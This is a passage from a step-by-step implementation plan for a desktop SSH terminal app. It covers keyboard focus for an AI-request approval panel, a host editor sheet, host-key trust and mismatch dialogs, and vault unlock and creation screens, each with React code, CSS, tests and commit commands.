      if (approvalsKey(e, navigator.platform)) {
        if (e.type === 'keydown') onFocusApprovals()
        return false
      }
      const a = clipboardKey(e, navigator.platform)
      if (a === 'copy' && e.type === 'keydown') document.execCommand('copy')
      return a === 'pass'
    })
```

`onFocusApprovals` is captured once when the terminal is created, so App must pass a stable function (Step 6 uses `useCallback` with no changing deps).

`TerminalTabs.tsx`: add `onFocusApprovals: () => void` to the props, pass it to each `TermView`, and add to `TerminalsHandle` and `useImperativeHandle`:

```ts
  focusActive(): void
```
```ts
    focusActive() { if (tabs.active) apis.get(tabs.active)?.focus() },
```

`ApprovalPanel.tsx`: add prop `onEscape: () => void` to `ApprovalPanel` and `Item`; pass it down; on the reason input add:

```tsx
          onKeyDown={(e) => { if (e.key === 'Escape') { e.preventDefault(); onEscape() } }}
```

- [ ] **Step 6: Focus handling in `App.tsx`**

```ts
  // Bumped by the terminal shortcut; the effect runs after the column (if it was
  // just opened) has mounted in the same commit. Arriving requests never focus.
  const [focusReason, setFocusReason] = useState(0)
  useEffect(() => {
    if (focusReason) (document.querySelector('.approvals .approval input') as HTMLInputElement | null)?.focus()
  }, [focusReason])
  const focusApprovals = useCallback(() => { setAiOpen(true); setFocusReason((n) => n + 1) }, [])
```

Pass `onFocusApprovals={focusApprovals}` to `<Terminals>` and `onEscape={() => terms.current?.focusActive()}` to `<ApprovalPanel>`.

- [ ] **Step 7: Add the e2e case to `desktop/e2e/keyboard.spec.ts`**

Append (reuses the file's `l` and `doorCall`; add `openBox` to its import from `./launch`):

```ts
test('an arriving request never takes focus; the shortcut and Esc move between terminal and Reason', async () => {
  const win = await l.app.firstWindow()
  const mod = process.platform === 'darwin' ? 'Meta' : 'Control'
  await openBox(win)
  const rows = win.locator('.xterm-rows')
  await win.keyboard.type('abc')
  const result = doorCall(l.socket, 'exec', { requestId: 'k2', client: 'e2e', server: 'box', command: 'echo k2', description: '' })
  const reason = win.locator('.approvals').getByPlaceholder('Reason (optional)')
  await expect(reason).toBeVisible()
  await win.keyboard.type('def')
  await expect(rows).toContainText('abcdef')
  await expect(reason).toHaveValue('')

  await win.keyboard.press(`${mod}+Shift+A`)
  await expect(reason).toBeFocused()
  await win.keyboard.press('Escape')
  await expect(win.locator('.xterm-helper-textarea')).toBeFocused()
  await win.keyboard.type('g')
  await expect(rows).toContainText('abcdefg')

  await win.keyboard.press(`${mod}+Shift+A`)
  const denied = expect(result).rejects.toThrow('Denied by user')
  await win.keyboard.press('Enter')
  await denied
})
```

- [ ] **Step 8: Run all checks**

Run: `npm run typecheck && npm test && npm run build && npx playwright test e2e/keyboard.spec.ts e2e/clipboard.spec.ts e2e/smoke.spec.ts`
Expected: all pass.

- [ ] **Step 9: Commit**

```bash
git add desktop/src/renderer desktop/test/terminals.test.ts desktop/e2e/keyboard.spec.ts
git commit -m "feat(desktop): Ctrl/Cmd+Shift+A reaches AI requests from a terminal

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01ALpoGjeMRZDpNY1DS7YHx2"
```

---

### Task 6: Host editor sheet

**Files:**
- Modify: `desktop/src/renderer/HostEditor.tsx` (rewrite), `desktop/src/renderer/hostForm.ts`, `desktop/src/renderer/styles.css` (section `editor`)
- Test: `desktop/test/hostForm.test.ts`

**Interfaces:**
- Consumes: icons (Task 1).
- Produces: `secretPlaceholder(saved: boolean, e: SecretEdit, endpointChanged?: boolean): string`; `EditorWarnings` returns `null` when there is nothing to warn about, otherwise one `div.warnings[role=status]`.

- [ ] **Step 1: Write failing unit tests** (in `desktop/test/hostForm.test.ts`)

Add to `describe('host editor secrets')`:

```ts
  it('says a saved secret will be cleared while the endpoint is changed', () => {
    expect(secretPlaceholder(true, { value: '', cleared: false }, true)).toBe('will be cleared')
    expect(secretPlaceholder(false, { value: '', cleared: false }, true)).toBe('')
    expect(secretPlaceholder(true, { value: 'new', cleared: false }, true)).toBe('saved')
  })
  it('renders the sheet with the full fingerprint, a unique Close, and a labelled auth group', () => {
    const html = renderToStaticMarkup(createElement(HostEditor, { server: box, openTabs: 0, onSave: noop, onForget: noop, onClose: () => {} }))
    expect(html).toContain('ssh-ed25519 SHA256:x')
    expect(html).toContain('aria-label="Close host editor"')
    expect(html.match(/>Close</g)).toHaveLength(1)
    expect(html).toContain('role="radiogroup" aria-label="Auth"')
    expect(html).toContain('Never shown. Leave empty to keep what is saved.')
  })
```

In `describe('host editor warnings')`, the aiVisible-only case already expects `''`; add:

```ts
  it('wraps warnings in one status box', () => {
    const d = draftFrom(box)
    const html = renderToStaticMarkup(createElement(EditorWarnings, { server: box, draft: { ...d, port: '2222' }, openTabs: 1 }))
    expect(html.match(/role="status"/g)).toHaveLength(1)
    expect(html).toContain('Saving will close 1 open tab.')
  })
```

- [ ] **Step 2: Run to verify failure**

Run: `npx vitest run test/hostForm.test.ts`
Expected: FAIL.

- [ ] **Step 3: Update `secretPlaceholder`** in `hostForm.ts`:

```ts
// A saved secret the hub will drop (Clear, or a host/port change without a new
// value) reads "will be cleared", so "saved" never promises what a save removes.
export function secretPlaceholder(saved: boolean, e: SecretEdit, endpointChanged = false): string {
  if (e.cleared) return 'will be cleared'
  if (!saved) return ''
  return endpointChanged && e.value === '' ? 'will be cleared' : 'saved'
}
```

- [ ] **Step 4: Rewrite `desktop/src/renderer/HostEditor.tsx`**

```tsx
import { useId, useState, type FormEvent, type KeyboardEvent } from 'react'
import type { SecretField, ServerInfo, ServerInput } from '../shared/protocol'
import { closesTabs, draftFrom, endpointChanged, SECRET_FIELDS, secretPlaceholder, toInput, type HostDraft } from './hostForm'
import { CloseIcon, WarningIcon } from './icons'

export function EditorWarnings({ server, draft, openTabs }: { server?: ServerInfo; draft: HostDraft; openTabs: number }) {
  const moved = endpointChanged(server, draft)
  const closes = openTabs > 0 && closesTabs(server, draft)
  if (!moved && !closes) return null
  return (
    <div className="warnings" role="status">
      {moved && <p><WarningIcon />Changing host or port forgets the host key and saved passwords unless you re-enter them.</p>}
      {closes && <p><WarningIcon />{`Saving will close ${openTabs} open ${openTabs === 1 ? 'tab' : 'tabs'}.`}</p>}
    </div>
  )
}

const AUTHS = ['password', 'key', 'agent'] as const

// server undefined = a new host. Secrets are never shown: an empty field
// keeps the saved value, Clear removes it.
export function HostEditor({ server, openTabs, focusForget, onSave, onForget, onClose }: {
  server?: ServerInfo; openTabs: number; focusForget?: boolean
  onSave: (input: ServerInput, original?: string) => Promise<void>
  onForget: (name: string) => Promise<void>
  onClose: () => void
}) {
  const id = useId()
  const [draft, setDraft] = useState(() => draftFrom(server))
  const [error, setError] = useState<string>()
  const [busy, setBusy] = useState(false)
  const set = (patch: Partial<HostDraft>) => setDraft((d) => ({ ...d, ...patch }))
  const setSecret = (field: SecretField, value: string, cleared = false) =>
    setDraft((d) => ({ ...d, secrets: { ...d.secrets, [field]: { value, cleared } } }))
  const run = async (p: () => Promise<void>) => {
    setBusy(true); setError(undefined)
    try { await p() } catch (e) { setError((e as Error).message) } finally { setBusy(false) }
  }
  const save = (e: FormEvent) => { e.preventDefault(); run(() => onSave(toInput(draft), server?.name)) }
  const escape = (e: KeyboardEvent) => { if (e.key === 'Escape' && !busy) { e.preventDefault(); onClose() } }
  const moved = endpointChanged(server, draft)
  const hostChanged = !!server && draft.host.trim() !== server.host
  const portChanged = !!server && Number(draft.port) !== server.port
  const field = (name: string) => `${id}-${name}`
  return (
    <div className="sheet-backdrop">
      <form className="sheet" role="dialog" aria-label="Host editor" onSubmit={save} onKeyDown={escape}>
        <header className="sheet-head">
          <h3>{server ? `Edit ${server.name}` : 'New host'}</h3>
          <button type="button" className="icon" aria-label="Close host editor" title="Close" onClick={onClose}><CloseIcon /></button>
        </header>
        <div className="sheet-body">
          <section>
            <h4 className="section-label">Connection</h4>
            <div className="grid2">
              <div className="field"><label htmlFor={field('name')}>Name</label>
                <input id={field('name')} value={draft.name} autoFocus={!focusForget} onChange={(e) => set({ name: e.target.value })} /></div>
              <div className="field"><label htmlFor={field('user')}>User</label>
                <input id={field('user')} className="mono" value={draft.user} onChange={(e) => set({ user: e.target.value })} /></div>
              <div className="field wide"><div className="labelrow"><label htmlFor={field('host')}>Host</label>
                {hostChanged && <span id={field('host-changed')} className="changed">· changed</span>}</div>
                <input id={field('host')} className={'mono' + (hostChanged ? ' is-changed' : '')} value={draft.host}
                  aria-describedby={hostChanged ? field('host-changed') : undefined} onChange={(e) => set({ host: e.target.value })} /></div>
              <div className="field narrow"><div className="labelrow"><label htmlFor={field('port')}>Port</label>
                {portChanged && <span id={field('port-changed')} className="changed">· changed</span>}</div>
                <input id={field('port')} className={'mono' + (portChanged ? ' is-changed' : '')} value={draft.port} inputMode="numeric"
                  aria-describedby={portChanged ? field('port-changed') : undefined} onChange={(e) => set({ port: e.target.value })} /></div>
              <div className="field"><span className="fieldlabel" id={field('auth')}>Auth</span>
                <div className="seg full" role="radiogroup" aria-label="Auth">
                  {AUTHS.map((a) => (
                    <button key={a} type="button" role="radio" aria-checked={draft.auth === a} onClick={() => set({ auth: a })}>{a}</button>
                  ))}
                </div></div>
              {/* The cell is kept for every auth, so switching never shifts the layout. */}
              <div className="field" style={{ visibility: draft.auth === 'key' ? 'visible' : 'hidden' }}>
                <label htmlFor={field('keypath')}>Key path</label>
                <input id={field('keypath')} className="mono" value={draft.keyPath} onChange={(e) => set({ keyPath: e.target.value })} /></div>
            </div>
          </section>
          <section>
            <div className="labelrow"><h4 className="section-label">Secrets</h4>
              <span className="muted">Never shown. Leave empty to keep what is saved.</span></div>
            <div className="grid2">
              {SECRET_FIELDS.map(({ field: f, label, has }) => {
                const saved = !!server && has(server)
                const edit = draft.secrets[f]
                return (
                  <div className="field" key={f}>
                    <div className="labelrow"><label htmlFor={field(f)}>{label}</label>
                      {saved && !edit.cleared && <button type="button" className="link" onClick={() => setSecret(f, '', true)}>Clear</button>}</div>
                    <input id={field(f)} type="password" autoComplete="off" value={edit.value}
                      placeholder={secretPlaceholder(saved, edit, moved)} onChange={(e) => setSecret(f, e.target.value)} />
                  </div>
                )
              })}
            </div>
          </section>
          <section className="aipanel">
            <label className="switch">
              <span>
                <span className="switch-title">Visible to AI</span>
                <span className="muted">AI clients can see this server and ask to run commands. Each command still waits for your approval.</span>
                {!server?.hostKey && <span className="muted">Needs a pinned host key.</span>}
              </span>
              <input type="checkbox" role="switch" checked={draft.aiVisible} onChange={(e) => set({ aiVisible: e.target.checked })} />
            </label>
          </section>
          {server && (
            <section>
              <h4 className="section-label">Host key</h4>
              {server.hostKey ? (
                <div className="keyrow">
                  <code className="fp">{`${server.hostKeyAlgo} ${server.hostKey}`.trim()}</code>
                  <button type="button" className="btn danger-outline" autoFocus={focusForget} disabled={busy}
                    onClick={() => run(() => onForget(server.name))}>Forget host key</button>
                  <span className="muted">Takes effect immediately.</span>
                </div>
              ) : (
                <p className="muted">Not pinned. You will be asked to confirm it on the next connect.</p>
              )}
            </section>
          )}
          <EditorWarnings server={server} draft={draft} openTabs={openTabs} />
        </div>
        <footer className="sheet-foot">
          {error && <p className="error">{error}</p>}
          <span className="spacer" />
          <button type="button" className="btn" onClick={onClose}>Close</button>
          <button type="submit" className="btn primary" disabled={busy}>Save</button>
        </footer>
      </form>
    </div>
  )
}
```

- [ ] **Step 5: Replace the `editor` section of `styles.css`**

```css
/* == editor == */
.sheet-backdrop { position: fixed; inset: 0; z-index: 10; background: rgba(0, 0, 0, 0.45); display: flex; justify-content: flex-end; }
.sheet { width: 600px; max-width: 100%; height: 100%; display: flex; flex-direction: column; background: var(--surface); border-left: 1px solid var(--line); box-shadow: var(--shadow); animation: slidein 160ms ease-out; }
@keyframes slidein { from { transform: translateX(24px); opacity: 0; } }
.sheet-head { display: flex; align-items: center; justify-content: space-between; padding: 18px 24px; border-bottom: 1px solid var(--divider); }
.sheet-head h3 { font-size: 18px; }
.sheet-body { flex: 1; min-height: 0; overflow: auto; padding: 16px 24px; display: flex; flex-direction: column; gap: 20px; }
.sheet-body section { display: flex; flex-direction: column; gap: 10px; }
.sheet-foot { display: flex; align-items: center; gap: 8px; padding: 14px 24px; border-top: 1px solid var(--divider); }
.sheet-foot .spacer { flex: 1; }
.grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px 12px; }
.grid2 .wide { grid-column: span 1; }
.field { display: flex; flex-direction: column; gap: 4px; min-width: 0; }
.field label, .fieldlabel { font-size: 12px; color: var(--label); }
.labelrow { display: flex; align-items: baseline; justify-content: space-between; gap: 8px; }
.changed { font-size: 11px; color: var(--wait); }
input.is-changed { border-color: var(--wait); }
.seg.full { display: flex; }
.seg.full button { flex: 1; height: 28px; font-size: 13px; }
.aipanel { background: var(--bg); border: 1px solid var(--divider); border-radius: 8px; padding: 12px 14px; }
.switch { display: flex; align-items: flex-start; justify-content: space-between; gap: 16px; }
.switch > span { display: flex; flex-direction: column; gap: 2px; }
.switch-title { font-weight: 600; }
.switch input { appearance: none; width: 36px; height: 20px; flex: none; border-radius: 10px; background: var(--line); position: relative; margin: 2px 0 0; }
.switch input::after { content: ""; position: absolute; top: 2px; left: 2px; width: 16px; height: 16px; border-radius: 50%; background: var(--surface); transition: transform 120ms ease-out; }
.switch input:checked { background: var(--accent); }
.switch input:checked::after { transform: translateX(16px); }
.keyrow { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; }
.fp { flex: 1 1 100%; background: var(--term-bg); color: var(--term-fg); border-radius: 6px; padding: 8px 10px; font-size: 12px; word-break: break-all; user-select: all; }
.warnings { background: var(--wait-tint); color: var(--wait); border-radius: 8px; padding: 10px 12px; display: flex; flex-direction: column; gap: 6px; font-size: 12px; }
.warnings p { display: flex; align-items: flex-start; gap: 8px; }
.warn-text { color: var(--wait); font-size: 12px; }
@media (max-width: 700px) { .sheet { width: 100%; } }
```

- [ ] **Step 6: Make the e2e Close click exact**

In `desktop/e2e/hosts.spec.ts`, step 5, `editor.getByRole('button', { name: 'Close' })` would now also match `Close host editor`. Change it to `editor.getByRole('button', { name: 'Close', exact: true })`.

- [ ] **Step 7: Run all checks**

Run: `npm run typecheck && npm test && npm run build && npx playwright test e2e/hosts.spec.ts`
Expected: all pass.

- [ ] **Step 8: Commit**

```bash
git add desktop/src/renderer/HostEditor.tsx desktop/src/renderer/hostForm.ts desktop/src/renderer/styles.css desktop/test/hostForm.test.ts desktop/e2e/hosts.spec.ts
git commit -m "feat(desktop): host editor as a sectioned slide-in sheet

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01ALpoGjeMRZDpNY1DS7YHx2"
```

---

### Task 7: Host-key dialogs

**Files:**
- Modify: `desktop/src/renderer/HostKeyDialog.tsx` (`HostKeyPromptView` and `HostKeyMismatchDialog` renders), `desktop/src/renderer/styles.css` (section `dialogs`)
- Test: `desktop/test/hostkeys.test.ts`

**Interfaces:**
- Consumes: icons (Task 1). `HostKeyDialog` (the stateful wrapper with the Trust delay) is unchanged.
- Produces: nothing new; same component names and props.

- [ ] **Step 1: Update the unit tests** (`desktop/test/hostkeys.test.ts`, `describe('HostKeyPromptView')`)

Replace the button-parsing line with a tag-stripping version and the Trust lookup:

```ts
    const buttons = [...html.matchAll(/<button([^>]*)>(.*?)<\/button>/g)]
      .map((m) => ({ attrs: m[1], text: m[2].replace(/<kbd[^>]*>.*?<\/kbd>/g, '').replace(/<[^>]+>/g, '') }))
    expect(buttons.filter((b) => /type="submit"/.test(b.attrs)).map((b) => b.text)).toEqual(['Cancel'])
    const trust = buttons.find((b) => b.text === 'Trust and connect')!
```

and add:

```ts
  it('never says "first connection" and never styles a known_hosts match as success', () => {
    const html = renderToStaticMarkup(createElement(HostKeyPromptView,
      { info: info('SHA256:abc', 'match'), trustEnabled: true, onTrust: () => {}, onCancel: () => {} }))
    expect(html).toContain('No host key is pinned for this server yet.')
    expect(html).not.toMatch(/first connection/i)
    expect(html).toContain('class="kh kh-match"')
  })
```

- [ ] **Step 2: Run to verify failure**

Run: `npx vitest run test/hostkeys.test.ts`
Expected: FAIL.

- [ ] **Step 3: Rewrite the two views in `HostKeyDialog.tsx`**

Add `import { CheckIcon, ShieldIcon, WarningIcon } from './icons'`. Replace `KNOWN_HOSTS_TEXT` and `HostKeyPromptView` with:

```tsx
const KNOWN_HOSTS = {
  match: { text: 'Your ~/.ssh/known_hosts lists this same key for this host.', icon: <CheckIcon /> },
  absent: { text: 'This host is not in your ~/.ssh/known_hosts.', icon: null },
  different: { text: 'Warning: your ~/.ssh/known_hosts lists a different key for this host. The connection may be intercepted.', icon: <WarningIcon /> },
}

// Cancel is the default (Enter) and has focus; Trust is mouse-only.
export function HostKeyPromptView({ info, trustEnabled: enabled, onTrust, onCancel }: {
  info: HostKeyUnknown; trustEnabled: boolean; onTrust: () => void; onCancel: () => void
}) {
  const kh = KNOWN_HOSTS[info.knownHosts]
  return (
    <div className="modal" role="dialog" aria-label="Unknown host key">
      <form className="dialog" onSubmit={(e) => { e.preventDefault(); onCancel() }}>
        <div className="dialog-title"><span className="dialog-icon"><ShieldIcon /></span><h3>Trust this host key?</h3></div>
        <p><strong>{info.server}</strong> <span className="mono muted">{`${info.user}@${info.host}:${info.port}`}</span></p>
        <p className="lead">No host key is pinned for this server yet. Check the fingerprint against one you got another way, from the server&apos;s console or its admin.</p>
        <div className="fpblock">
          <span className="fplabel">{`${info.keyType} fingerprint`}</span>
          <code className="fp">{info.fingerprint}</code>
        </div>
        <p className={`kh kh-${info.knownHosts}`}>{kh.icon}{kh.text}</p>
        <p className="muted">Trust only if this matches the key you expect. Once trusted it is pinned, and a different key later is refused.</p>
        <div className="dialog-actions">
          <button type="button" className="btn allow" tabIndex={-1} onKeyDown={blockKeyboardActivation}
            disabled={!enabled} onClick={onTrust}>Trust and connect</button>
          <button type="submit" className="btn primary" autoFocus>Cancel<kbd aria-hidden="true">↵</kbd></button>
        </div>
      </form>
    </div>
  )
}
```

Replace `HostKeyMismatchDialog`'s JSX with:

```tsx
    <div className="modal" role="dialog" aria-label="Host key mismatch">
      <div className="dialog mismatch">
        <div className="dialog-title"><span className="dialog-icon danger"><WarningIcon /></span><h3>Host key changed</h3></div>
        <p><strong>{info.server}</strong> <span className="mono muted">{`${info.user}@${info.host}:${info.port}`}</span></p>
        <p className="banner-danger">This server presented a different host key than the one pinned. The connection may be intercepted. Nothing was sent.</p>
        <div className="fpblock"><span className="fplabel">Pinned</span><code className="fp">{info.pinned}</code></div>
        <div className="fpblock"><span className="fplabel danger">Presented now</span><code className="fp danger">{info.presented}</code></div>
        <p className="lead"><strong>Did the key change on purpose?</strong> If the server was rebuilt or its keys rotated, confirm the new fingerprint with its admin, then forget the old key in the host editor and connect again.</p>
        <div className="dialog-actions">
          <button className="btn" onClick={onEdit}>Open host editor</button>
          <button className="btn primary" autoFocus onClick={onClose}>Close</button>
        </div>
      </div>
    </div>
```

- [ ] **Step 4: Replace the `dialogs` section of `styles.css`**

```css
/* == dialogs == */
.modal { position: fixed; inset: 0; z-index: 20; background: rgba(0, 0, 0, 0.5); display: flex; align-items: center; justify-content: center; }
.dialog { background: var(--surface); border: 1px solid var(--line); border-radius: 10px; box-shadow: var(--shadow); padding: 20px 24px; width: 520px; max-width: calc(100% - 32px); max-height: 90%; overflow: auto; display: flex; flex-direction: column; gap: 12px; }
.dialog.mismatch { border-color: var(--danger); border-top-width: 3px; }
.dialog-title { display: flex; align-items: center; gap: 10px; }
.dialog-title h3 { font-size: 18px; }
.dialog-icon { width: 32px; height: 32px; border-radius: 8px; display: grid; place-items: center; background: var(--accent-tint); color: var(--accent); }
.dialog-icon.danger { background: var(--danger-tint); color: var(--danger); }
.lead { color: var(--label); }
.fpblock { display: flex; flex-direction: column; gap: 4px; }
.fplabel { font-size: 11px; font-weight: 600; letter-spacing: 0.06em; color: var(--muted); }
.fplabel.danger, .fp.danger { color: var(--danger); }
.kh { display: flex; align-items: flex-start; gap: 8px; font-size: 12px; color: var(--muted); }
.kh-different { color: var(--danger); }
.banner-danger { background: var(--danger-tint); color: var(--danger); border-radius: 8px; padding: 10px 12px; }
.dialog-actions { display: flex; justify-content: flex-end; gap: 8px; margin-top: 4px; }
.dialog-actions .allow { background: transparent; color: var(--ok); border: 1px solid var(--ok); }
.dialog-actions kbd { margin-left: 6px; }
.mismatch-text { color: var(--danger); }
```

- [ ] **Step 5: Run all checks**

Run: `npm run typecheck && npm test && npm run build && npx playwright test e2e/hosts.spec.ts`
Expected: all pass (`Trust` still matches `Trust and connect`; `Cancel` still matches).

- [ ] **Step 6: Commit**

```bash
git add desktop/src/renderer/HostKeyDialog.tsx desktop/src/renderer/styles.css desktop/test/hostkeys.test.ts
git commit -m "feat(desktop): clearer host-key trust and mismatch dialogs

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_01ALpoGjeMRZDpNY1DS7YHx2"
```

---

### Task 8: Unlock, Create vault, hub screens and the store banner

**Files:**
- Modify: `desktop/src/renderer/Unlock.tsx`, `desktop/src/renderer/CreateVault.tsx`, `desktop/src/renderer/StoreError.tsx`, `desktop/src/renderer/hostForm.ts`, `desktop/src/renderer/App.tsx` (lock reason, `HubScreen`), `desktop/src/renderer/styles.css` (sections `lock`, `layout` banner rule)
- Test: `desktop/test/hostForm.test.ts`

**Interfaces:**
- Consumes: `Mark`, icons (Task 1).
- Produces: `passwordChecks(pw: string, again: string): { length: boolean; match: boolean }` (replaces `vaultPasswordProblem`, which is removed); `Unlock` props `{ onUnlock, error, lockReason?: 'idle' | 'manual', storePath?: string }`; App state `lockReason?: 'idle' | 'manual'` (replaces `idleLocked`).

- [ ] **Step 1: Replace the `vaultPasswordProblem` test** in `desktop/test/hostForm.test.ts` (and its import) with:

```ts
describe('passwordChecks', () => {
  it('needs 8 characters and a non-empty matching confirmation', () => {
    expect(passwordChecks('short', 'short')).toEqual({ length: false, match: true })
    expect(passwordChecks('password1', 'password2')).toEqual({ length: true, match: false })
    expect(passwordChecks('password1', '')).toEqual({ length: true, match: false })
    expect(passwordChecks('password1', 'password1')).toEqual({ length: true, match: true })
  })
})
```

- [ ] **Step 2: Run to verify failure**

Run: `npx vitest run test/hostForm.test.ts`
Expected: FAIL (`passwordChecks` not exported).

- [ ] **Step 3: In `hostForm.ts`, replace `vaultPasswordProblem` with:**

```ts
// Create vault's live checklist; the button stays disabled until both hold.
export function passwordChecks(pw: string, again: string): { length: boolean; match: boolean } {
  return { length: pw.length >= 8, match: again !== '' && pw === again }
}
```

- [ ] **Step 4: Rewrite `Unlock.tsx`**

```tsx
import { useState, type FormEvent } from 'react'
import { Mark } from './icons'

// lockReason is set after an idle or manual lock of a running hub; after a hub
// restart it is undefined, because the old terminals have ended.
export function Unlock({ onUnlock, error, lockReason, storePath }: {
  onUnlock: (pw: string) => Promise<void>; error?: string; lockReason?: 'idle' | 'manual'; storePath?: string
}) {
  const [pw, setPw] = useState('')
  const [busy, setBusy] = useState(false)
  const submit = async (e: FormEvent) => {
    e.preventDefault()
    setBusy(true)
    try { await onUnlock(pw) } finally { setBusy(false); setPw('') }
  }
  return (
    <div className="lockpage">
      <form className="lockcard" onSubmit={submit}>
        <Mark />
        <h1>Unlock vault</h1>
        {lockReason === 'idle' && <span className="chip wait lockchip">Locked after inactivity.</span>}
        {lockReason && <p className="muted">Open terminals stay connected while locked. AI requests are refused until you unlock.</p>}
        <div className="field">
          <label htmlFor="unlock-pw">Master password</label>
          <input id="unlock-pw" type="password" autoFocus value={pw} onChange={(e) => setPw(e.target.value)} disabled={busy} />
        </div>
        {error && <p className="error">{error}</p>}
        <button type="submit" className="btn primary block" disabled={busy || pw === ''}>Unlock</button>
      </form>
      {storePath && <p className="lockpath muted">Vault file <code>{storePath}</code></p>}
    </div>
  )
}
```

(The `lockchip` keeps `text-transform: none` so the text stays exactly `Locked after inactivity.`)

- [ ] **Step 5: Rewrite `CreateVault.tsx`**

```tsx
import { useState, type FormEvent } from 'react'
import type { ServerInfo } from '../shared/protocol'
import { passwordChecks } from './hostForm'
import { CheckIcon, Mark, WarningIcon } from './icons'

export function CreateVault({ servers, onCreate }: { servers: ServerInfo[]; onCreate: (pw: string) => Promise<void> }) {
  const [pw, setPw] = useState('')
  const [again, setAgain] = useState('')
  const [busy, setBusy] = useState(false)
  const [error, setError] = useState<string>()
  const checks = passwordChecks(pw, again)
  const ok = checks.length && checks.match
  const submit = async (e: FormEvent) => {
    e.preventDefault()
    if (!ok) return
    setBusy(true); setError(undefined)
    try { await onCreate(pw) } catch (err) { setError((err as Error).message) } finally { setBusy(false) }
  }
  return (
    <div className="lockpage">
      <form className="lockcard" onSubmit={submit}>
        <Mark />
        <h1>Create your vault</h1>
        <p className="muted">The master password encrypts saved passwords and protects the host list.</p>
        <div className="field"><label htmlFor="cv-pw">New master password</label>
          <input id="cv-pw" type="password" autoFocus value={pw} onChange={(e) => setPw(e.target.value)} disabled={busy} /></div>
        <div className="field"><label htmlFor="cv-again">Confirm master password</label>
          <input id="cv-again" type="password" value={again} onChange={(e) => setAgain(e.target.value)} disabled={busy} /></div>
        <ul className="checklist" aria-live="polite">
          <li className={checks.length ? 'done' : ''}><CheckIcon />At least 8 characters{checks.length ? '' : ' (not yet)'}</li>
          <li className={checks.match ? 'done' : ''}><CheckIcon />Both passwords match{checks.match ? '' : ' (not yet)'}</li>
        </ul>
        <p className="box wait"><WarningIcon />The master password cannot be recovered. If you forget it, this vault cannot be unlocked and its saved passwords are lost.</p>
        {servers.length > 0 && (
          <div className="box">
            <p className="muted">These servers from your existing file are kept, with Visible to AI turned off and their host keys unpinned; you&apos;ll confirm each key on the next connect.</p>
            <ul className="keptlist">{servers.map((s) => <li key={s.name}>{s.name} <span className="mono muted">{`${s.user}@${s.host}:${s.port}`}</span></li>)}</ul>
          </div>
        )}
        {error && <p className="error">{error}</p>}
        <button type="submit" className="btn primary block" disabled={busy || !ok}>Create vault</button>
      </form>
    </div>
  )
}
```

- [ ] **Step 6: Store banner and App changes**

`StoreError.tsx`:

```tsx
import { WarningIcon } from './icons'

// Shown while the hub's last reload of the vault file was refused (status
// storeError); it has no close button and goes away once a reload succeeds.
export function StoreErrorBanner({ message }: { message?: string }) {
  if (!message) return null
  return <div className="store-error" role="alert"><WarningIcon /><span>{message}</span></div>
}
```

`App.tsx`:
- replace `const [idleLocked, setIdleLocked] = useState(false)` with `const [lockReason, setLockReason] = useState<'idle' | 'manual'>()`;
- in the `locked` event branch replace `setIdleLocked(e.params?.reason === 'idle')` with `setLockReason(e.params?.reason === 'idle' ? 'idle' : 'manual')`;
- replace every other `setIdleLocked(false)` with `setLockReason(undefined)` (hub not running, successful unlock);
- replace the unlock branch of the render with:

```tsx
      ) : (
        <Unlock onUnlock={unlock} error={screen.error} lockReason={lockReason} storePath={status?.storePath} />
      ))}
```

- render `CreateVault` without the `.center` wrapper: `<CreateVault servers={servers} onCreate={createVault} />`;
- replace `HubScreen` with:

```tsx
function HubScreen({ state }: { state: HubState }) {
  const [now, setNow] = useState(Date.now())
  const [since] = useState(Date.now())
  useEffect(() => {
    if (state.kind !== 'restarting') return
    const t = setInterval(() => setNow(Date.now()), 1000)
    return () => clearInterval(t)
  }, [state])
  if (state.kind === 'failed') {
    return (
      <div className="lockpage"><div className="lockcard wide">
        <Mark />
        <h1>The hub stopped</h1>
        <p>{state.message}</p>
        {state.stderr && <pre className="stderr">{state.stderr}</pre>}
      </div></div>
    )
  }
  if (state.kind === 'restarting') {
    const left = Math.max(0, Math.round((since + state.inMs - now) / 1000))
    return (
      <div className="lockpage"><div className="lockcard">
        <Mark />
        <h1>{`Hub crashed. Restarting in ${left} s (attempt ${state.attempt}).`}</h1>
        <p className="muted">The vault will be locked again after the restart. Open terminals will end.</p>
      </div></div>
    )
  }
  return (
    <div className="lockpage"><div className="lockcard">
      <Mark />
      <p className="starting"><span className="spinner" aria-hidden="true" />Starting the hub…</p>
    </div></div>
  )
}
```

Render `HubScreen` with `key` so the countdown restarts per attempt: `<HubScreen key={screen.state.kind === 'restarting' ? `r${screen.state.attempt}` : screen.state.kind} state={screen.state} />`. Import `Mark` from `./icons`.

- [ ] **Step 7: Replace the `lock` section of `styles.css`, and the banner rule in `layout`**

In `layout`, replace the `.store-error` rule with:

```css
.store-error { min-height: 40px; display: flex; align-items: center; gap: 10px; padding: 8px 16px; background: var(--danger-tint); color: var(--danger); border-bottom: 1px solid var(--divider); }
.store-error span::first-letter { text-transform: uppercase; }
```

```css
/* == lock == */
.lockpage { min-height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 16px; padding: 24px; background: var(--bg); }
.lockcard { width: 400px; max-width: 100%; background: var(--surface); border: 1px solid var(--divider); border-radius: 10px; padding: 28px; display: flex; flex-direction: column; gap: 14px; box-shadow: var(--shadow); }
.lockcard.wide { width: 640px; }
.lockcard h1 { font-size: 22px; letter-spacing: -0.02em; }
.lockchip { align-self: flex-start; text-transform: none; letter-spacing: 0; font-size: 12px; }
.btn.block { width: 100%; height: 38px; }
.lockpath { font-size: 12px; }
.checklist { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: 4px; font-size: 12px; color: var(--muted); }
.checklist li { display: flex; align-items: center; gap: 6px; }
.checklist li .ico { opacity: 0.35; }
.checklist li.done { color: var(--ok); }
.checklist li.done .ico { opacity: 1; }
.box { border-radius: 8px; padding: 10px 12px; background: var(--bg); display: flex; gap: 8px; align-items: flex-start; flex-direction: column; font-size: 12px; }
.box.wait { flex-direction: row; background: var(--wait-tint); color: var(--wait); }
.keptlist { margin: 0; padding-left: 16px; }
.starting { display: flex; align-items: center; gap: 10px; }
